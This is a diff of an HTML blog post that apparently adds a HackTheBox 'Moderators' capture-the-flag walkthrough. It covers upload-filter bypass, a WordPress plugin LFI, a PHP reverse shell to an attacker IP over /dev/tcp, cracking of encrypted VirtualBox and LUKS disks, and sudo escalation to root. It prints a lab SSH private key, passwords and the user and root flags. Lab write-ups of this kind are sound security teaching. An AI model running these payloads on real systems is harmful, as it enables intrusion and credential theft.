@@ -70,10 +70,17 @@
 					<title>tag</title>
 					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
 				</svg>
-				<a class="tag" href="#">SQL-Injection</a>
-				<a class="tag" href="#">AXFR</a>
-				<a class="tag" href="#">Directory-Path-Traversal</a>
-				<a class="tag" href="#">fail2ban</a>
+				<a class="tag" href="#">IDOR</a>
+				<a class="tag" href="#">Fuzzing</a>
+				<a class="tag" href="#">PHP</a>
+				<a class="tag" href="#">LFI</a>
+				<a class="tag" href="#">RCE</a>
+				<a class="tag" href="#">Port Forwarding</a>
+				<a class="tag" href="#">Wordpress</a>
+				<a class="tag" href="#">SSH</a>
+				<a class="tag" href="#">MySQL</a>
+				<a class="tag" href="#">VirtualBox</a>
+				<a class="tag" href="#">LUKS</a>
 			</div>
 
 			</header>
@@ -83,15 +90,16 @@
 			
 <!--Machine Overview-->
 			<div class="subtitle">Moderators Overview</div>
-			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Trick" rel="noreferrer noopener" target="_blank">Trick</a> machine on HackTheBox, submitted by 
-			<a href="https://app.hackthebox.com/users/184611" rel="noreferrer noopener" target="_blank">Geiseric</a>. The machine starts from a web server running nginx,
-			eventually leading to <a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" rel="noreferrer noopener" target="_blank">Domain Zone Transfer attack via AXFR</a>, exposing a new domain vulnerable to <a href="https://portswigger.net/web-security/sql-injection" rel="noreferrer noopener" target="_blank">SQL injection</a>.
-			From which configuration files can be enumerated which eventually lead to LFI and gain access via ssh, and finally abusing sudoers <a href="https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation" rel="noreferrer noopener" target="_blank">fail2ban</a> privileges.
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Moderators" rel="noreferrer noopener" target="_blank">Moderators</a> machine on HackTheBox, submitted by
+			<a href="https://app.hackthebox.com/users/389926" rel="noreferrer noopener" target="_blank">kavigihan</a>. The machine starts with a "bit" of web enumeration, which lead us to a file upload page
+			in which we need to bypass some filters to get a shell, once we're in we discover a wordpress vulnerable plugin which we can abuse to pivot to another user.
+			From there we find some mysql credentials in the wordpress config, wich we can use to change the password and login at the wp-admin web, and get the ssh key from the last user,
+			eventually we find an encrypted vbox image which, after crack it and mount it, we can get the password of the user who has full sudoers privileges.
 
 <!--Machine Resolution-->
 			<h1 id="header-1">Recon</h1>
 
-  	          <p class="head-img">As always let's start with a portscan, we have only port 22 and 80, according to the openssh version it's a focal ubuntu, we have an apache server, but there really isn't much more</p>
+  	          <p class="head-img">As always let's start with a portscan, we only have port 22 and 80 open, according to the openssh version it's a focal ubuntu, we also have an apache server, and there isn't much more</p>
             <img class="img-post" style="max-width: 1271px;" src="/images/HTB/moderators/nmap.png">
 
 			<p class="head-img">Basically the same after running whatweb, let's start by enumerating some directories</p>
@@ -100,7 +108,7 @@
 <span class="x">http://10.10.11.173</span> [200 OK] Apache[<span class="kt"> 2.4.41</span>], Bootstrap[<span class="kt"> 3.3.7</span>], Country[RESERVED][<span class="kt"> ZZ</span>], Frame, HTTPServer[<span class="gd"> Ubuntu Linux</span>][<span class="kt"> Apache/2.4.41 (Ubuntu)</span>], IP[<span class="x"> 10.10.11.173</span<], JQuery[<span class="kt">3.2.1</span>], Script, Title[<span class="k"> Moderators</span>]
 </span>	</code></pre></div></div>
 
-			<p class="head-img">We have some interesting where to start</p>
+			<p class="head-img">We have some interesting ones where to start</p>
 		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> gobuster </span>dir --no-error -t 200 -u http://10.10.11.173 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
 ===============================================================
@@ -135,7 +143,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 </span> </code></pre></div></div>
 
-			<p class="head-img">In blog.php we find some posts about vulnerabilities, in some we can find a report and its id or something like that, we can fuzz to see if there are some that don't appear  on the web</p>
+			<p class="head-img">In blog.php we find some posts about vulnerabilities, in some of them we can find a report and its id, we can fuzz to see if there are some other that doesn't appear on the web</p>
 			<img class="img-post" style="max-width: 423px;" src="/images/HTB/moderators/reports.png"></img>
 
 
@@ -340,7 +348,7 @@ www-data   10882  0.0  0.0   3304   652 pts/0    S+   21:08   0:00 grep lexi
 2022/11/05 21:34:05 client: Connected (Latency 89.177788ms)
 </span> </code></pre></div></div>
 
-            <p class="head-img">There is nothing useful on the main page but since it is wordpress and mysql is running we could try to get credentials to log in at wp-admin</p>
+            <p class="head-img">There is nothing useful on the main page but since it is wordpress and mysql is running we could try to get credentials to log in at /wp-admin/</p>
             <img class="img-post" style="max-width: 390px;" src="/images/HTB/moderators/wp-login.png"></img>
 
             <p class="head-img">With some enum of the site, we can figure out that it is vulnerable to LFI at this path /opt/site.new/wp-content/plugins</p>
@@ -357,7 +365,7 @@ Shellcodes: No Results
             <p class="head-img">So, we go to a writable directory, as the callback.php is going to request wp-load.php, we are going to save our reverse shell with that name</p>
         <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="ld"><span class="k">www-data@moderators:/var/www/html/logs/uploads$</span> cd /dev/shm/
-<span class="k">www-data@moderators:/dev/shm $</span> echo -n "<?php echo fread(popen("<span>bash -c 'bash -i >& /dev/tcp/10.10.16.50/4444 0>&1'", "r"), 4096);; ?>" > wp-load.php
+<span class="k">www-data@moderators:/dev/shm $</span> echo -n <span>"<</span>?php echo fread(popen("<span>bash -c 'bash -i >& /dev/tcp/10.10.16.50/4444 0>&1'", "r"), 4096);; ?>" > wp-load.php
 </span> </code></pre></div></div>
 
             <p class="head-img">We just have to make the request</p>
@@ -416,10 +424,12 @@ J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==
 <span class="k">lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ </span>
 </span> </code></pre></div></div>
 
-            <p class="head-img">You can forward the port via ssh or just upload chisel again</p>
+            <p class="head-img">You can forward the port via ssh or just upload chisel again, we can also read the user flag</p>
         <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">ssh </span>-i lexi.id_rsa lexi@10.10.11.173 -L 8000:localhost:8080
 
+<span class="k">lexi@moderators:~$</span> cat user.txt
+934a2af370034c61f99884a215b97f10
 <span class="k">lexi@moderators:~$</span>
 </span> </code></pre></div></div>
 
@@ -478,10 +488,116 @@ MariaDB [<span class="kt">wordpress</span>]>
             <p class="head-img">Once in, we can read john's ssh key, also Carls password</p>
             <img class="img-post" style="max-width: 1191px;" src="/images/HTB/moderators/wp-passwords.png"></img>
 
-            <p class="head-img"></p>
+            <p class="head-img">John's ssh key</p>
         <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="na">❯ </span><span class="ld"><span class="kt"> </span>
+<span class="na">❯ </span><span class="ld"><span class="kt">cat </span>john.id_rsa
 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once in, we can find a VBOX directory with some virtual box files, in order to run the box we need to change some things in the <a href="https://pastebin.com/JK8FCxEy" rel="noreferrer noopener" target="_blank">vbox</a> file</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">john@moderators:~/stuff/VBOX$</span> ls
+2019-08-01.vbox  2019.vdi
+<span class="k">john@moderators:~/stuff/VBOX$</span>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">The vdi file is encrypted, but we can use <a href="https://github.com/axcheron/pyvboxdie-cracker" rel="noreferrer noopener" target="_blank">pyvboxdie-cracker</a></p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">python3 </span> pyvboxdie-cracker.py -v 2019-08-01.vbox -d /usr/share/wordlists/rockyou.txt
+Starting pyvboxdie-cracker...
+
+[*] Encrypted drive found :  F:/2019.vdi
+[*] KeyStore information...
+ Algorithm = AES-XTS256-PLAIN64
+ Hash = PBKDF2-SHA256
+ Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
+
+[*] Starting bruteforce...
+ 51 password tested...
+
+[*] Password Found = <span class="gd">computer</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">To continue we need install the virtual box extension pack</p>
+            <img class="img-post" style="max-width: 598px;" src="/images/HTB/moderators/vbox_ext.png"></img>
+
+            <p class="head-img">Once ubuntu is installed we add the vdi image and enable the encription</p>
+            <img class="img-post" style="max-width: 505px;" src="/images/HTB/moderators/vdi_add.png"></img>
+
+            <p class="head-img">When we try to mount it we get a crypto_LUKS error, but we can use <a href="https://github.com/Diverto/cryptsetup-pwguess/releases" rel="noreferrer noopener" target="_blank">cryptsetup-pwguess</a> to get the password</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">ubuntu@ubuntu:~$</span> sudo mount /dev/sda /dev/shm
+mount: /dev/shm: unknown filesystem type 'crypto_LUKS'
+
+<span class="k">ubuntu@ubuntu:~$</span> ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda
+Password found: <span class="gd">abc123</span>
+<span class="k">ubuntu@ubuntu:~$</span>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">After mount it and digging for a while, we can find the password for john in scripts/all-in-one/distro_update.sh</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">passwd='<span class="gd">$_THE_best_Sysadmin_Ever_</span>'</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we logged in as john we can see that we can run anything as root</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">john@moderators:~$</span> sudo -l
+[sudo] password for john: <span class="kt">$_THE_best_Sysadmin_Ever_</span>
+Matching Defaults entries for john on moderators:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/bin
+
+User john may run the following commands on moderators:
+    (root) ALL
+<span class="k">john@moderators:~$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">We only have to do 'sudo su' and that's it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">john@moderators:~$</span> sudo su
+<span class="k">john@moderators:~$</span> id
+uid=0(root) gid=0(root) groups=0(root)
+<span class="k">john@moderators:~$</span> cat /root/root.txt
+1765cd96cb0733204704e71f84db792d
 </span> </code></pre></div></div>
 
 <a href="#">Go back</a>
